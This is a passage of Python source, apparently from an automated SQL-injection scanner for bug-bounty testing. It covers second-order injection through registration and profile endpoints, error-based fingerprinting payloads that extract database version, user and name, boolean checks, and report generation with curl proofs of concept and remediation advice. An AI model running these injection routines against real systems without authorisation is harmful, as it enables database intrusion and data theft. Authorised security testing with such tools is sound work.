                               'OOB SQLi',
                               {'db_hint': db_hint, 'callback': cb,
                                'note': 'Check callback server for DNS/HTTP hits'}, '')

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 12 — Second-Order SQLi
    # ══════════════════════════════════════════════════════════════════════════

    async def _phase_second_order(self, target: str, params: List[str]):
        """
        Store a payload in one field, then fetch a profile/display page
        to check if the payload is executed in a different SQL context.
        """
        marker = "RPTR_2ND_" + hashlib.md5(target.encode()).hexdigest()[:8]
        second_order_payload = f"'{marker}"

        store_paths = ['/register', '/signup', '/profile/update',
                       '/account/update', '/user/update', '/settings']
        fetch_paths = ['/profile', '/account', '/user/profile',
                       '/me', '/dashboard', '/settings']

        parsed = urlparse(target)
        base   = f'{parsed.scheme}://{parsed.netloc}'

        for store_path in store_paths:
            store_url = base + store_path
            for param in params[:3]:
                # Attempt to store
                resp = await self._make_request(
                    store_url, method='POST', data={param: second_order_payload}
                )
                if not resp or resp.status not in (200, 201, 302):
                    continue

                # Now fetch display page and look for DB errors
                for fetch_path in fetch_paths:
                    fetch_url = base + fetch_path
                    resp2     = await self._make_request(fetch_url)
                    if not resp2:
                        continue
                    body2   = await resp2.text()
                    db_type = self._match_error(body2)
                    if db_type:
                        self._emit(store_url, param,
                                   SQLiPayload(second_order_payload, 'second_order',
                                               db_type, db_type, 'Critical'),
                                   'Second-Order SQLi',
                                   {'store_url': store_url, 'trigger_url': fetch_url,
                                    'db_type': db_type}, body2)
                        return

    # ══════════════════════════════════════════════════════════════════════════
    #  DB Fingerprinting
    # ══════════════════════════════════════════════════════════════════════════

    async def _fingerprint(self, target: str, param: str, db_type: str) -> Dict:
        """Attempt to extract version / user / db name via error-based injection."""
        fp: Dict[str, Any] = {
            'db_type':    db_type,
            'version':    None,
            'user':       None,
            'database':   None,
            'techniques': ['error'],
            'confidence': 0.7,
        }
        meta = self.db_meta.get(db_type, {})
        if not meta:
            return fp

        self.detected_db = db_type

        # Version via CONCAT trick
        for field_name, query in [('version', meta.get('version', '')),
                                   ('user',    meta.get('user',    '')),
                                   ('database',meta.get('database',''))]:
            if not query:
                continue
            marker = f'RPTR_{field_name.upper()}_'
            payload = f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({query}),0x7e))-- -"
            resp    = await self._make_request(self._build_url(target, param, payload))
            if not resp:
                continue
            body = await resp.text()
            m = re.search(r'~([^~<]+)~', body)
            if m:
                fp[field_name] = m.group(1).strip()
                fp['confidence'] = 0.95

        # Check for boolean capability
        r_t = await self._make_request(self._build_url(target, param, "1 AND 1=1"))
        r_f = await self._make_request(self._build_url(target, param, "1 AND 1=2"))
        if r_t and r_f:
            bt = await r_t.text()
            bf = await r_f.text()
            if _similarity(bt, bf) < 0.95:
                fp['techniques'].append('boolean')

        return fp

    # ══════════════════════════════════════════════════════════════════════════
    #  Finding factory
    # ══════════════════════════════════════════════════════════════════════════

    _SEVERITY_MAP = {
        'Error-based':          'High',
        'Boolean-based Blind':  'High',
        'Time-based Blind':     'High',
        'UNION-based':          'Critical',
        'Stacked Queries':      'Critical',
        'Header-based Error':   'High',
        'JSON Body SQLi':       'High',
        'OOB SQLi':             'Critical',
        'Second-Order SQLi':    'Critical',
    }
    _CVSS_MAP = {
        'Error-based':          8.6,
        'Boolean-based Blind':  8.1,
        'Time-based Blind':     8.1,
        'UNION-based':          9.8,
        'Stacked Queries':      9.8,
        'Header-based Error':   8.6,
        'JSON Body SQLi':       8.6,
        'OOB SQLi':             9.8,
        'Second-Order SQLi':    9.8,
    }
    _BOUNTY_MAP = {
        'Error-based':          3000,
        'Boolean-based Blind':  4000,
        'Time-based Blind':     4000,
        'UNION-based':          5000,
        'Stacked Queries':      6000,
        'Header-based Error':   3000,
        'JSON Body SQLi':       3500,
        'OOB SQLi':             6000,
        'Second-Order SQLi':    6000,
    }

    def _emit(self, target: str, param: str, payload_obj: SQLiPayload,
              technique: str, fingerprint: Dict, evidence_body: str):
        sev    = self._SEVERITY_MAP.get(technique, 'High')
        cvss   = self._CVSS_MAP.get(technique, 8.1)
        bounty = self._BOUNTY_MAP.get(technique, 3000)
        db     = payload_obj.db_type

        waf_note = (f'WAF detected ({self.waf_name}) — evasion applied.'
                    if self.waf_name else 'No WAF detected.')

        fp_md = ''
        if fingerprint:
            lines = [f'- **{k.capitalize()}:** {v}' for k, v in fingerprint.items() if v]
            fp_md = '\n### DB Fingerprint\n' + '\n'.join(lines)

        f = Finding(
            module      = 'sqli',
            title       = f'[{technique}] SQL Injection in "{param}" ({db})',
            severity    = sev,
            description = (
                f'## SQL Injection — {technique}\n\n'
                f'**Parameter:** `{param}`  \n'
                f'**Database:** {db}  \n'
                f'**Technique:** {technique}  \n'
                f'**WAF:** {waf_note}\n\n'
                f'### Payload\n```sql\n{payload_obj.payload}\n```\n'
                f'{fp_md}\n\n'
                '### Impact\n'
                'SQL injection allows reading, modifying or deleting any database data, '
                'authentication bypass, and — in stacked/OOB/xp_cmdshell cases — '
                'full OS command execution.\n\n'
                '### Remediation\n'
                'Use parameterised queries (prepared statements) for **every** SQL call. '
                'Apply least-privilege DB accounts. '
                'Disable verbose error messages in production. '
                'Deploy a WAF as a defence-in-depth layer (not a primary control).'
            ),
            evidence    = {
                'parameter':   param,
                'payload':     payload_obj.payload,
                'technique':   technique,
                'db_type':     db,
                'fingerprint': fingerprint,
                'waf':         self.waf_name,
            },
            poc         = f"curl '{target}?{param}={quote(payload_obj.payload)}'",
            remediation = (
                'Parameterised queries / prepared statements. '
                'Least-privilege DB accounts. '
                'Suppress DB error messages in production.'
            ),
            cvss_score  = cvss,
            bounty_score= bounty,
            target      = target,
        )
        self.findings.append(f)
        self.add_finding(f)

    # ══════════════════════════════════════════════════════════════════════════
    #  Helpers
    # ══════════════════════════════════════════════════════════════════════════

    def _build_url(self, base: str, param: str, value: str) -> str:
        """Inject value into a URL parameter, preserving other params."""
        parsed = urlparse(base)
        qs     = parse_qs(parsed.query)
        qs[param] = [value]
        new_qs = '&'.join(f'{k}={quote(v[0], safe="")}' for k, v in qs.items())
        return parsed._replace(query=new_qs).geturl()
